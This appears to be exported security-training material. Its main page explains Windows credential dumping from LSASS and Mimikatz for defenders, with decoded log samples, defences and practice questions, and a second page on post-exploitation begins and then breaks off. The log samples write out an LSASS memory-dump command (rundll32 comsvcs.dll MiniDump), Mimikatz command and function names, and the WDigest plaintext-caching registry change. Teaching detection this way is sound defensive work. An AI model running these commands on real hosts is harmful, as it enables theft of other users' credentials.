docs.title: Credential Dumping and Mimikatz — From One Admin to Many Accounts
Credential Dumping and Mimikatz — From One Admin to Many Accounts
docs.text:
What this page covers

What happens right after an attacker becomes admin on one Windows host: they dump credentials — read the passwords, hashes and tickets that Windows keeps for every user signed in to that machine — and use them to log in as someone else, somewhere else. Why this needs admin rights in the first place, and why it is still worth it for an attacker who already is admin. How Windows single sign-on works and why it means lsass.exe holds your secrets in memory. What Mimikatz is, what it can and can't recover on modern Windows (usually a hash, not plaintext), and why "just block Mimikatz" doesn't work (recompiled, renamed, rewritten in PowerShell, run only in memory, and many look-alike tools). Then the chain that makes credential dumping so dangerous: a machine with many users signed in turns one compromise into many stolen accounts, and the attacker hops host to host until a domain admin is caught. Every sample (Sysmon 10 access to lsass.exe with GrantedAccess decoded, Sysmon 13 WDigest change, PowerShell 4104, a redacted dump result, 4624 logon type 9 seclogo and network logon with NTLM, 7045 for a driver, Credential Guard and LSA protection checks) is broken down field by field. Practice questions at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, hashes and file names are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. Credential Access (TA0006) is its own ATT&CK tactic; dumping credentials from the operating system is T1003 OS Credential Dumping, and reading them out of the lsass.exe process is T1003.001 LSASS Memory. In practice it works as privilege escalation by identity: the attacker uses access they already have to become other accounts.
  2. It is different from the escalation tricks on the previous page because it requires admin (or SYSTEM) first. Reading another process's memory or the protected parts of the registry is something only administrators can do.
  3. Why bother if you're already admin? Because the dump gives you every account signed in to that machine, not just your own — and sometimes the plaintext password, which works everywhere that password works.
  4. Windows stores credentials for single sign-on: you type your password once, and Windows keeps derived secrets (NTLM hash, Kerberos tickets, sometimes reversible forms) in memory in lsass.exe so it can answer for you later. That convenience is exactly what the attacker steals.
  5. Mimikatz (ATT&CK software S0002) is the best-known tool that reads those secrets from lsass.exe. On modern, well-configured Windows it usually gets hashes and tickets, not plaintext — but a hash is enough to log in elsewhere (T1550.002 Pass the Hash, T1550.003 Pass the Ticket).
  6. You can't defend by blocking one file: Mimikatz exists recompiled, custom-built, renamed, as a PowerShell version that runs only in memory, and as features inside other tools — plus many other tools dump LSASS the same way. Detect the behaviour (something opening lsass.exe to read its memory), not the file name.
  7. The real danger is the chain: an admin on a server where many people are signed in can dump them all; each stolen account opens more machines; repeat until a domain admin is found. One machine becomes the whole network — this is how lateral movement (TA0008) is fuelled.
  8. The best defences limit what is there to steal and who can steal it: keep admin credentials scarce and never sign in to low-trust machines with high-privilege accounts, unique local admin passwords (LAPS), Credential Guard, LSA protection, the Protected Users group, and the Defender rule that blocks credential theft from LSASS.

docs.title: Where it sits in the attack
docs.text:
On the previous page the attacker climbed from a normal user to local admin or SYSTEM on one host. That is the end of the first climb, but it is only one machine. The attacker's real goals — the file server, the finance system, the domain controller — are elsewhere, and they need accounts that work there.

Credential dumping is the bridge. ATT&CK files it under the tactic Credential Access (TA0006), technique T1003 OS Credential Dumping, with sub-techniques for each place Windows and Linux keep secrets:

Sub-technique Where the secrets come from Admin needed? T1003.001 LSASS Memory Memory of lsass.exe — signed-in users' hashes, tickets, sometimes plaintext Yes (debug-level access to a SYSTEM process) T1003.002 Security Account Manager SAM registry hive — local account hashes Yes T1003.004 LSA Secrets SECURITY hive — service account passwords, machine secrets Yes (SYSTEM) T1003.005 Cached Domain Credentials SECURITY hive — slow-to-crack hashes of recent domain logons Yes (SYSTEM) T1003.003 NTDS ntds.dit on a domain controller — every domain account Yes, on a DC T1003.006 DCSync Asks a DC to replicate password data over the network Replication rights (usually Domain Admin-level) T1003.007 / .008 Linux: process memory via /proc, /etc/shadow root

This page focuses on T1003.001 because that is where the "many users at once" effect comes from. The others are covered in SAM and NTDS extraction and DCSync.

docs.title: Why admin rights are required — and why it is still worth it
docs.text:
Think of a hotel. Every guest has a key card for their own room. The front desk keeps a master record of all key-card codes in a locked back office. A burglar who has picked one guest's lock (a normal user) can only get into that room. A burglar who has got into the back office (admin) can copy every guest's code — and the front desk computer will happily cut new cards from them.

Technically:

  • lsass.exe runs as SYSTEM. To read its memory, a process needs a handle with PROCESS_VM_READ access to it. Windows only grants that to processes that already have admin rights with SeDebugPrivilege (debug programs), which by default belongs to Administrators — not to normal users.
  • The SAM and SECURITY registry hives are locked to SYSTEM, so even admins have to take extra steps (save the hive, or read it as SYSTEM).

So a normal user can't dump credentials. That is why credential dumping comes after privilege escalation. But once admin, the attacker gains three things they didn't have:

  1. Other people's accounts. The dump returns everyone signed in: the help-desk tech who fixed something yesterday, the scheduled task's service account, the admin who used RDP last week (if their session is still alive).
  2. A form that works elsewhere. An NTLM hash or a Kerberos ticket can be replayed to other machines without ever knowing the password. If the attacker gets plaintext, they can also use it in web portals, VPNs, email — anywhere the user reused it.
  3. Persistence through identity. Malware gets cleaned up; a stolen password keeps working until someone resets it. Many "eradicated" incidents come back because the attacker simply logs in again.

[Supplement] What exactly is a “hash” here, and why it is as good as a password

Windows doesn't store your password; it stores the NT hash (often called the NTLM hash) — a fixed 32-hex-character value computed from the password. The NTLM authentication protocol proves you know the password by doing maths with the hash, not with the password itself. So whoever holds the hash can answer the server's challenge exactly as you would. That is why "they only got the hash" is not reassuring: for NTLM it is the credential. Kerberos is similar: a stolen ticket (TGT or service ticket) can be presented as-is until it expires. See Pass-the-Hash and Golden and Silver tickets.

docs.title: How Windows single sign-on puts secrets in memory
docs.text:
Here is the design choice that makes all of this possible. Microsoft wants you to type your password once. After you sign in, opening a file share, your mailbox, an intranet site or a printer should just work — that's single sign-on (SSO).

To do that, Windows has to answer authentication requests on your behalf, minutes or hours after you typed the password. So at sign-in the Local Security Authority Subsystem Service, lsass.exe, keeps what it needs in its own memory, organised by authentication packages (security support providers):

Package What it keeps Why MSV1_0 (NTLM) The NT hash Answer NTLM challenges for file shares, older apps Kerberos Tickets (TGT, service tickets) and keys derived from the password Get new service tickets without asking you again WDigest Historically a reversibly stored plaintext password Old HTTP Digest authentication — off by default since Windows 8.1 / Server 2012 R2 TsPkg / CredSSP Credentials delegated for RDP / remote sign-in Pass your sign-in to a remote server Credential Manager (vault) Saved passwords for sites, shares, apps "Remember my credentials"

That table is the attacker's shopping list. A tool that can read lsass.exe memory and understands these structures can pull out a hash per user, tickets per session, and plaintext wherever a package still keeps it.

The analogy: SSO is like handing a trusted concierge copies of all your keys so they can open doors for you all day. It's convenient — until someone robs the concierge.

[Supplement] Which logons leave reusable secrets behind

Not every logon parks credentials in lsass.exe on the machine being logged on to. This matters enormously for the "many users" problem below.

Logon type (4624 LogonType) Example Reusable secrets left on that host? 2 Interactive Signing in at the keyboard Yes 10 RemoteInteractive Normal RDP session Yes 4 Batch / 5 Service Scheduled task or service with a stored password Yes (and the password is in LSA secrets) 9 NewCredentials runas /netonly Yes (the alternate credentials) 3 Network Opening \\server\share, most remote management No (normally only proves identity; no password or reusable hash stored)

So an admin who manages a server over a network logon (type 3) leaves far less behind than one who RDPs in (type 10). RDP's Restricted Admin mode and Remote Credential Guard exist to make RDP behave more like a network logon in this respect.

docs.title: What it is
docs.text:
Mimikatz is an open-source Windows security tool written by a French researcher and first released around 2011. It started as a proof that Windows kept recoverable credentials in memory, and grew into a toolbox for nearly everything to do with Windows credentials: reading them from lsass.exe, reading the SAM and LSA secrets, exporting and injecting Kerberos tickets, forging tickets, DCSync, and more. It shows up in breach report after breach report — from ransomware crews to state-sponsored groups — because it is effective, free and well documented. ATT&CK tracks it as software S0002.

It is also the main reason for the rule you hear from every defender: don't use an admin account for daily work, and never sign in to ordinary machines with a domain admin account. Every time you do, you leave a key in the concierge's pocket.

docs.title: How it works, at the level a defender needs
docs.text:
You do not need to run Mimikatz to defend against it. You need to know what it touches, because that is what you can see:

  1. It needs privilege. It enables SeDebugPrivilege (only possible for admins) or runs as SYSTEM.
  2. It opens a handle to lsass.exe asking for memory-read rights. This is the single most important detection point.
  3. It reads and decodes memory — locating each authentication package's structures and decrypting the stored secrets with keys that are also in lsass.exe memory.
  4. It prints or saves the results: user name, domain, NT hash, sometimes a plaintext password, Kerberos tickets.

Its commands are grouped in modules (for example sekurlsa for reading LSASS, lsadump for SAM/LSA secrets/DCSync, kerberos for tickets). You will see those module names in PowerShell logs, command lines and EDR alerts, so it's worth recognising them — sekurlsa::logonpasswords is the classic "dump everything from LSASS" command.

Here is what a result looks like when defenders recover it from an attacker's output file or a script log (secrets redacted):

Authentication Id : 0 ; 4519873 (00000000:0044f7c1)
Session           : RemoteInteractive from 2
User Name         : b.santos
Domain            : CORP
Logon Server      : DC01
Logon Time        : 2026-11-17 09:12:40
SID               : S-1-5-21-1111111111-2222222222-3333333333-1188
        msv :
         [00000003] Primary
         * Username : b.santos
         * Domain   : CORP
         * NTLM     : [redacted - 32 hex characters]
        wdigest :
         * Username : b.santos
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : b.santos
         * Domain   : CORP.EXAMPLE
         * Password : (null)

Reading it line by line:

  • Authentication Id : 0 ; 4519873 (00000000:0044f7c1) — the logon session ID (LUID). The hex value 0x44f7c1 is the same TargetLogonId you would find in that user's 4624 event — so you can tie the dump back to when and how that user signed in.
  • Session : RemoteInteractive from 2 — the user is signed in over RDP (logon type 10). Their secrets are here because they used RDP to this box.
  • User Name : b.santos / Domain : CORP / Logon Server : DC01 — who, which domain, and which DC authenticated them.
  • msv → NTLM : … — the NT hash. This alone is enough for pass-the-hash.
  • wdigest → Password : (null) — WDigest isn't caching plaintext (the default on modern Windows). On an old or misconfigured host this line would show the actual password.
  • kerberos → Password : (null) — no plaintext from Kerberos either; tickets would be listed by the ticket commands.

A full dump contains one such block per logon session — which is the whole point of the next section.

[Supplement] Why old hosts leak plaintext, and the WDigest trick

On Windows 7 / Server 2008 R2 and earlier, WDigest kept a decryptable copy of your password by default, so Mimikatz printed plaintext. Microsoft turned that off (built-in from Windows 8.1 / Server 2012 R2, update for older versions), controlled by the registry value HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential. Attackers with admin set it back to 1 and wait: the next time someone signs in, the plaintext is cached again. That change is easy to catch (Sysmon 13, below) — and ATT&CK files it under T1112 Modify Registry.

docs.title: Why "just block Mimikatz" doesn't work
docs.text:
A reasonable first thought: antivirus knows Mimikatz; block its hash and name, done. It fails for several reasons:

  • Recompiled from source. The code is public. Compile it yourself and the file hash changes; small changes to strings and structure beat many signatures.
  • Custom builds. Attackers strip the famous strings, rename functions, pack or encrypt it.
  • Other languages, no file at all. It has been ported or wrapped into PowerShell (the old Invoke-Mimikatz script), C#, Python and others. A one-line download cradle can pull such a script from the internet and run it entirely in memory — nothing is written to disk for antivirus to scan (PowerShell download cradles).
  • Built into frameworks. Many command-and-control frameworks include Mimikatz-like features or load it as a module.
  • Other tools, same technique. Instead of decoding in place, attackers often dump the whole lsass.exe memory to a file with a legitimate-looking tool or a built-in Windows DLL, copy the file out, and decode it offline on their own machine. Then no Mimikatz ever runs on your network.

So the defender's question is not "did mimikatz.exe run?" but "did anything open lsass.exe to read its memory, or write a dump of it?"

docs.title: Finding credential dumping in the logs
1. Something opened LSASS — Sysmon 10
docs.text:
Sysmon event 10 (ProcessAccess) records one process opening a handle to another. Configured to watch lsass.exe, it is the best single signal:

Event ID: 10   Process accessed
UtcTime:        2026-11-18 03:14:22.508
SourceProcessId: 7344
SourceImage:    C:\Users\Public\Music\svchost64.exe
SourceUser:     CORP\adm.jlee
TargetProcessId: 712
TargetImage:    C:\Windows\system32\lsass.exe
TargetUser:     NT AUTHORITY\SYSTEM
GrantedAccess:  0x1010
CallTrace:      C:\Windows\SYSTEM32\ntdll.dll+9d204|C:\Windows\System32\KERNELBASE.dll+2c13e|UNKNOWN(00000204A1B3C2D1)
  • Event ID 10 — "process accessed": a handle was opened. It doesn't say what was read, only that the door was opened with certain rights.
  • SourceImage C:\Users\Public\Music\svchost64.exe — the opener. A "svchost" look-alike in a public user folder is a fake: the real svchost.exe lives in System32. Legitimate LSASS openers are a short, known list (your EDR/AV, MsMpEng.exe, wininit.exe, some management agents).
  • SourceUser CORP\adm.jlee — an admin account. Remember: dumping needs admin, so an admin source user is expected for an attack, not reassuring.
  • TargetImage …\lsass.exe — the target is the credential store.
  • GrantedAccess 0x1010 — the access mask, which tells you what kind of door was opened. Decode it as bits:
    • 0x1000 = PROCESS_QUERY_LIMITED_INFORMATION (basic info about the process)
    • 0x0010 = PROCESS_VM_READ (read its memory)
    • Together, 0x1010 = "let me read LSASS memory" — the classic Mimikatz-style mask. Other masks worth alerting on include 0x1410, 0x1438, 0x143a and 0x1fffff (full access). Many harmless tools ask only for 0x1000 or 0x1400 (query information, no memory read).
  • CallTrace … UNKNOWN(00000204A1B3C2D1) — the chain of code that made the call. Normal entries name a DLL on disk. UNKNOWN means code running from memory that isn't backed by any file — typical of injected or reflectively loaded tools. This is how you catch in-memory Mimikatz even when nothing touched the disk.

docs.title: 2. A dump file was written — Sysmon 11 / 4688
docs.text:
If the attacker dumps LSASS to a file instead, look for the process that did it and the file it wrote:

EventID:            4688
NewProcessName:     C:\Windows\System32\rundll32.exe
CommandLine:        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Windows\Temp\wd.bin full
ParentProcessName:  C:\Windows\System32\cmd.exe
SubjectUserName:    adm.jlee
TokenElevationType: %%1937
  • NewProcessName …\rundll32.exe — rundll32 runs a function exported from a DLL. A favourite living-off-the-land binary (LOLBins).
  • CommandLine … comsvcs.dll, MiniDump 712 … full — calls the MiniDump function of a built-in Windows DLL on process ID 712 — which, from the Sysmon 10 event above, is lsass.exe — and writes a full memory dump to C:\Windows\Temp\wd.bin. The file extension is deliberately not .dmp.
  • TokenElevationType %%1937 — an elevated token (UAC "yes" was given or bypassed). Again: admin is required.

Pair it with Sysmon 11 (file created) for wd.bin, and with Sysmon 10 showing rundll32.exe opening lsass.exe. Then hunt for the file being copied out (SMB from that host, a cloud upload, a new archive). See LSASS dumping for the wider family (dump utilities, Task Manager's "Create dump file", custom dumpers).

docs.title: 3. The PowerShell version in memory — 4104
docs.text:
When the PowerShell port runs from a download cradle, script block logging captures its body:

Log Name:       Microsoft-Windows-PowerShell/Operational
Event ID:       4104
Level:          Warning
Computer:       SRV-APP-07.corp.example
User:           CORP\adm.jlee
Message:        Creating Scriptblock text (3 of 112):
                ...
                function Invoke-Mimikatz
                ...
                $PEBytes64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAA...
ScriptBlock ID: 0c4a8f1e-5b77-4d2a-9e63-4f1d0a2b9c11
Path:
  • Level Warning — PowerShell itself marked this block suspicious and logged it automatically.
  • (3 of 112) — a very large script split across 112 events; join them with the ScriptBlock ID.
  • function Invoke-Mimikatz — the classic function name (attackers often rename it, so don't rely on this alone).
  • $PEBytes64 = "TVqQ…" — a long Base64 string starting with TVqQ, which is Base64 for MZ — the start of a Windows executable. The script carries a whole program inside itself and loads it into memory. A huge Base64 blob that begins with TVqQ in a script block is suspicious whatever the function is called.
  • Path: empty — not from a file on disk; it came from memory or the command line.

AMSI lets Defender or your EDR inspect the same text at run time and block it.

docs.title: 4. Someone turned plaintext caching back on — Sysmon 13
docs.text:
Event ID: 13   Registry value set
UtcTime:      2026-11-18 03:09:57.114
Image:        C:\Windows\System32\reg.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
Details:      DWORD (0x00000001)
User:         CORP\adm.jlee
  • TargetObject …\WDigest\UseLogonCredential — the switch for plaintext caching.
  • Details DWORD (0x00000001) — set to 1 = on. On a modern Windows host there is almost never a legitimate reason. Alert on any write of 1 here, then expect a dump after the next sign-in.

docs.title: 5. Stolen credentials being used — 4624
docs.text:
The dump itself is quiet on the network; using the result is not. Two patterns are worth knowing (logon events get their own page in a later section):

On the attacker's host, a pass-the-hash launcher typically starts a process with new credentials:

EventID:                   4624
LogonType:                 9
LogonProcessName:          seclogo
AuthenticationPackageName: Negotiate
SubjectUserName:           adm.jlee
TargetUserName:            adm.jlee
TargetOutboundUserName:    c.ito
TargetOutboundDomainName:  CORP
  • 4624 — "an account was successfully logged on".
  • LogonType 9 — NewCredentials: "keep my local identity, but use different credentials for network access" — what runas /netonly does. Legitimate, but rare on most workstations and servers.
  • LogonProcessName seclogo — the Secondary Logon service. Logon type 9 with seclogo from an unusual process is a well-known pass-the-hash pattern.
  • TargetOutboundUserName c.ito — the network identity being used: someone else's account, i.e. the stolen credential.

On the machine the attacker moves to, the logon arrives as a network logon using NTLM:

EventID:                   4624
Computer:                  FS-FIN-02.corp.example
LogonType:                 3
TargetUserName:            c.ito
LogonProcessName:          NtLmSsp
AuthenticationPackageName: NTLM
LmPackageName:             NTLM V2
KeyLength:                 0
WorkstationName:           SRV-APP-07
IpAddress:                 10.20.4.37
  • LogonType 3 — network logon (share access, remote service, etc.).
  • TargetUserName c.ito — the account used.
  • AuthenticationPackageName NTLM / LogonProcessName NtLmSsp — NTLM rather than Kerberos. In a modern domain most logons between domain machines use Kerberos; pass-the-hash forces NTLM.
  • KeyLength 0 — no session key — common for NTLM network logons and often seen with pass-the-hash.
  • WorkstationName SRV-APP-07 / IpAddress 10.20.4.37 — where it came from. If c.ito is a finance user who has never signed in from an application server, this is the lead.

No single 4624 proves pass-the-hash, but Sysmon 10 on SRV-APP-07 → 4624 type 9 seclogo → new NTLM type 3 logons from SRV-APP-07 for accounts that never used it is a chain that very rarely has an innocent explanation.

docs.title: 6. Breaking LSA protection — 7045
docs.text:
If LSA protection is on (below), plain Mimikatz can't open lsass.exe. Attackers then try to remove the protection using a kernel driver — Mimikatz ships one (mimidrv.sys), and vulnerable signed drivers are used the same way (BYOVD, see Privilege Escalation). Loading a driver creates a service:

EventID:      7045
Service Name: mimidrv
Image Path:   C:\Users\Public\Music\mimidrv.sys
Service Type: kernel mode driver
Start Type:   demand start
Account Name:
  • Service Type kernel mode driver — code that will run in the kernel.
  • Image Path in a public user folder — drivers belong in System32\drivers or vendor folders.
  • Service Name mimidrv — the default name, though anyone serious will rename it. The shape (new kernel driver from a user-writable path, just before LSASS access) is the real signal.

docs.title: From one admin to the whole network
The chain, step by step
docs.text:
Here is why attackers love this so much. Follow one compromise:

[Alice's laptop]          admin: Alice           signed in: Alice
      | dump  -> Alice's hash
      v
[App server SRV-APP-07]   admin: Alice (help-desk group)   signed in: Bob, Charlie (RDP)
      | dump  -> Bob's and Charlie's hashes
      v
[Charlie's laptop]        admin: Charlie         signed in: Charlie, d.admin (left an RDP session)
      | dump  -> domain admin's hash
      v
[Domain admin's laptop / DC]  -> every account in the domain -> sensitive data, ransomware
  1. Alice's laptop. Alice opens a malicious attachment; the attacker escalates to admin and dumps. They get Alice's credential. Alice is a member of a help-desk group that is local admin on many servers.
  2. SRV-APP-07. With Alice's hash the attacker logs in to an application server where Bob and Charlie are signed in over RDP. Dump again: now they have Bob's and Charlie's credentials too. One compromise has become three.
  3. Charlie's laptop. Charlie is admin on his own laptop. The attacker moves there, dumps, and finds that a domain admin RDP'd in to fix something last week and the session is still open.
  4. Game over. With domain admin, the attacker can reach every machine and every account — steal data, push ransomware through Group Policy, create backdoor accounts.

The analogy: one picked lock gives you a master key ring from the front desk; one key on that ring opens the staff office, which has another ring; and eventually you find the building manager's ring.

Two lessons hide in the diagram:

  • A shared server with many signed-in users is a jackpot. Terminal servers, jump hosts, and any server where admins RDP in are worth far more to an attacker than a single workstation. Protect them as such.
  • Admin rights are the chain's links. Every hop worked because some account was admin on the next machine. If Alice weren't local admin on SRV-APP-07, or if Charlie weren't admin on his laptop, the chain would break. That's why "control your administrative credentials" is the single most important Windows-network defence.

docs.title: Breaking the chain
docs.text:
Defence Which link it breaks Tiering / no high-privilege sign-in on low-trust machines (domain admins only on DCs and dedicated admin workstations) There's no domain-admin secret on Charlie's laptop to steal Unique local admin passwords — LAPS (Windows LAPS is built in) One stolen local admin hash no longer works on every workstation Remove standing local admin for users and broad help-desk groups; use just-in-time elevation The hop to the next machine fails Network logons instead of RDP for admin tasks; RDP with Restricted Admin or Remote Credential Guard Admins stop leaving reusable secrets on servers Protected Users group for admins No NTLM, no cached credentials, short Kerberos tickets — less to steal and shorter use Credential Guard NT hashes and Kerberos TGTs are moved into an isolated, virtualisation-protected process; reading lsass.exe no longer returns them LSA protection (RunAsPPL) lsass.exe runs as a protected process; even admin tools can't open it for memory read without a kernel driver Defender ASR rule "Block credential stealing from the Windows local security authority subsystem" Blocks untrusted processes from reading LSASS memory WDigest off and monitored No plaintext to recover

[Supplement] Checking that Credential Guard and LSA protection are actually running

Don't assume — check. For Credential Guard:

Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard |
  Select-Object SecurityServicesConfigured, SecurityServicesRunning

SecurityServicesConfigured SecurityServicesRunning
-------------------------- -----------------------
{1, 2}                     {1, 2}
  • Get-CimInstance … Win32_DeviceGuard — queries the virtualisation-based security status.
  • SecurityServicesConfigured {1, 2} — what policy asks for: 1 = Credential Guard, 2 = memory integrity (HVCI).
  • SecurityServicesRunning {1, 2} — what is actually running. If 1 is missing here, Credential Guard is configured but not running (often a hardware or firmware gap).

For LSA protection, look in the System log for WinInit event 12, written at boot: "LSASS.exe was started as a protected process with level: 4". If it is missing, LSASS is not protected. Plug-ins blocked from loading into protected LSASS appear in Microsoft-Windows-CodeIntegrity/Operational (for example events 3033 and 3063).

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

Credential dumping is still one of the most common steps in hands-on intrusions and ransomware cases, and LSASS memory (T1003.001) is still the favourite source. Mimikatz itself is still seen, but more often its technique appears through other tools, built-in Windows DLLs, custom dumpers and C2 modules — exactly why behaviour-based detection (handle to lsass.exe, dump file creation, UNKNOWN call traces) is the standard. The chain from one admin to many accounts still describes how most domain compromises happen, and "don't put privileged credentials on low-trust machines" is still the core advice.

[Changed] What has changed

  • Credential Guard is on by default in more places. Starting with Windows 11 22H2 and Windows Server 2025, Microsoft turns it on by default on domain-joined, non-domain-controller systems that meet the requirements (Enterprise/Education editions, VBS and Secure Boot capable hardware), without UEFI lock. Where it runs, dumping LSASS no longer yields NT hashes or TGTs of signed-in domain users.
  • LSA protection is on by default on new enterprise installs. On Windows 11 22H2 and later it is enabled automatically for new installs (not upgrades) that are enterprise-joined (AD, Entra or hybrid) and HVCI-capable. Attackers respond with kernel drivers and BYOVD to remove the protection — so watch new drivers (7045, Sysmon 6) as part of credential-theft detection.
  • NTLM is on its way out. NTLMv1 was removed in Windows 11 24H2 and Windows Server 2025, and in 2026 Microsoft published a phased plan to disable network NTLM by default in future Windows releases. That shrinks pass-the-hash, but most networks still allow NTLM today; check Microsoft's current guidance for the exact timing in your versions.
  • Theft has moved toward tokens and the cloud. In hybrid environments attackers increasingly steal browser session cookies and cloud tokens (Entra ID refresh tokens, primary refresh tokens) from endpoints — often with commodity infostealers — instead of or as well as NT hashes. ATT&CK covers this as T1539 Steal Web Session Cookie and T1528 Steal Application Access Token. LSASS protections don't stop this, so MFA alone is not enough; token protection and device-bound sessions matter.
  • ATT&CK. T1003 and its sub-techniques, T1550.002/.003 and Mimikatz (S0002) keep their IDs; the v19 tactic split of Defense Evasion into Stealth and Defense Impairment affects related techniques such as disabling protections, not credential access itself.

[Caution] Where the old way is wrong or risky today

  • Don't detect only the name or hash of mimikatz.exe. It will be recompiled, renamed or run in memory. Detect LSASS access, dump creation, WDigest changes and unusual NTLM logons.
  • Don't assume Credential Guard protects everything. It doesn't protect the SAM (local accounts), domain controllers (not recommended there) or ntds.dit, and an admin attacker can still capture passwords typed after the compromise (for example with a malicious security support provider or a keylogger). Also check it is actually running, not just "Windows 11".
  • Don't trust "it's only a hash". For NTLM, the hash is the credential. Reset the password — and for very privileged accounts reset twice where Kerberos keys are involved (for krbtgt, follow the documented double-reset procedure).
  • Don't use RDP with a domain admin account to "quickly check" a workstation or a shared server. That's how the chain above reaches the top. Use a dedicated admin workstation and network-based tools, or Remote Credential Guard.
  • Don't run LSASS-dumping tools yourself on production for "testing" without approval. You'll create real credential files that someone must protect, and you'll train your own analysts to ignore the alert.

docs.title: Question 1
docs.text:
On SRV-APP-07 you find Sysmon event 10: SourceImage = C:\Users\Public\Music\svchost64.exe, TargetImage = C:\Windows\system32\lsass.exe, GrantedAccess = 0x1010, and the CallTrace ends in UNKNOWN(...). The source user is CORP\adm.jlee. What does each detail tell you, and what do you do next?

Answer and explanation

0x1010 = PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_VM_READ: something asked to read LSASS memory — the core action of credential dumping (T1003.001). The source binary is a fake "svchost" in a public user folder, not a known LSASS opener such as the AV/EDR. UNKNOWN in the call trace means the calling code had no file backing it — an injected or in-memory tool. The admin source user is expected (dumping needs admin), so it means adm.jlee — or whoever has that session — is compromised.

Next: isolate the host; treat every account signed in to SRV-APP-07 around that time as stolen (list them from 4624 events and active sessions — RDP users especially); look for the earlier escalation and how adm.jlee was obtained; look for dump files (Sysmon 11), WDigest changes (Sysmon 13) and new drivers (7045); then hunt for use of those accounts elsewhere — new NTLM type 3 logons and 4624 type 9 seclogo from this host. Reset the affected passwords and review why so many users were signed in to an application server.

docs.title: Question 2
docs.text:
A terminal server has 40 users signed in over RDP, including two help-desk accounts that are local admin on all workstations. An attacker gets local admin on it. Why is this so much worse than local admin on a single laptop, and which three changes would most reduce the damage?

Answer and explanation

RDP sessions are logon type 10 — they leave reusable secrets (NT hashes, Kerberos tickets) in that server's lsass.exe. With admin, one dump yields 40 accounts at once, including two that are admin on every workstation, so the attacker can move to any PC and keep dumping until a more privileged account appears. A single laptop usually holds one or two users.

The most effective changes: (1) remove broad standing local admin from help-desk accounts (just-in-time elevation) and use LAPS so local admin passwords differ per machine; (2) keep privileged accounts off shared servers — admins use network logons or Remote Credential Guard/Restricted Admin, and put admins in Protected Users; (3) turn on Credential Guard and LSA protection on that server (and verify they run), plus the ASR rule against LSASS credential theft and Sysmon 10 alerting on LSASS access.

docs.title: Question 3
docs.text:
A manager says: "We added the Mimikatz file hash to our antivirus block list and blocked any file named mimikatz.exe, so credential dumping is covered." How do you respond?

Answer and explanation

That covers only the least capable attacker. Mimikatz is open source, so a recompiled or modified build has a different hash; renaming defeats the name rule; the PowerShell and other ports can be pulled by a one-liner and run only in memory, with no file to scan; C2 frameworks include the same features; and attackers often skip Mimikatz entirely by dumping lsass.exe to a file with built-in Windows components (for example rundll32 comsvcs.dll MiniDump) and decoding it offline.

What actually covers it: behaviour detection — Sysmon 10 / EDR alerts on processes opening lsass.exe with memory-read rights, dump-file creation, 4104 script-block logging and AMSI, WDigest registry changes, new kernel drivers — plus prevention that removes the prize: Credential Guard, LSA protection, the ASR rule, Protected Users, LAPS and keeping privileged accounts off low-trust machines.

docs.title: Execution, Persistence and Discovery — What the Attacker Does Right After the Exploit
Execution, Persistence and Discovery — What the Attacker Does Right After the Exploit
docs.text:
What this page covers

What changes the moment an exploit lands: the attacker now "owns" a process on the box, and everything that follows is post-exploitation. How MITRE ATT&CK organises those activities into tactics, techniques and sub-techniques, and why SOCs use it as a detection checklist. Then the first three post-exploitation tactics in detail: Execution — getting code to run (the payload inside the exploit, a plain shell or a full C2 agent, and breaking out of a restricted interpreter such as SQL Server's xp_cmdshell), and why application control is so effective against it; Persistence — why an attacker might deliberately not persist, why most do, and why layered persistence makes half-finished remediation fail (Run keys, scheduled tasks, services, WMI); Discovery — the "living off the land" enumeration of users, groups, privileges, files, services, hosts and software, why single-command alerts drown a SOC, and how to detect discovery as a burst instead. Every sample (4688, Sysmon 1/13, 4698, 7045, AppLocker 8004, SQL Server 15457, command output) is broken down field by field. Practice questions at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, hashes and file names are invented for illustration (.example, documentation and private IPs).

docs.title: The 8 key points
docs.text:
1. After a successful exploit the attacker has code execution inside a process on your host. From here on, every step is post-exploitation, and every step makes clean-up harder and more expensive.
  2. MITRE ATT&CK lists the attacker's goals as tactics (the "why": Execution, Persistence, Discovery…), the ways to reach each goal as techniques (the "how": T1053 Scheduled Task/Job), and finer variants as sub-techniques (T1053.005 Scheduled Task). Many SOCs use it as the minimum list of behaviours they should be able to detect.
  3. Execution: the first code usually rides inside the exploit as its payload. It typically opens a command shell or loads a richer C2 agent (Meterpreter-style), which is then used to download and run more tools.
  4. Sometimes the attacker lands in an interpreter, not a shell — a SQL prompt, an admin web console, a scripting engine. They then use that environment's own features to run OS commands; SQL Server's xp_cmdshell is the classic example. Evidence: sqlservr.exe → cmd.exe.
  5. Without execution an attacker can do almost nothing, which is why application control is so powerful: every blocked attempt is both a stop and an early alarm.
  6. Persistence is a trade-off. It gives reliable access across reboots, log-offs and partial clean-ups, but every Run key, task or service is a change your tools can find. A stealth-first attacker (especially one with a re-usable service-side hole) may skip it.
  7. Attackers often layer persistence — e.g. a Run key that starts the implant plus a scheduled task that re-downloads it if deleted. Remediation that removes one and misses the other fails. Hunt for all of them before declaring a host clean.
  8. Discovery — who am I, what groups, what privileges, which files, services, hosts and software — is done mostly with built-in commands (whoami, net, nltest, tasklist, netstat, dir /s). Each one alone is normal admin noise; a burst of many different ones from one unusual parent or account is the signal.

docs.title: What changes when the exploit lands
docs.text:
Before the exploit, the attacker is outside knocking on doors. After it, they are inside a running process with that process's identity (see the attacker becomes the process). Think of a burglar who has just climbed through a window: getting in was one act, but what they do in the next hour — prop a door open for later, look through drawers, find the safe, find the keys to other buildings — is where the real damage happens. Those next-hour activities are post-exploitation.

Why does this matter for the SOC? Because the cost of response climbs with every step:

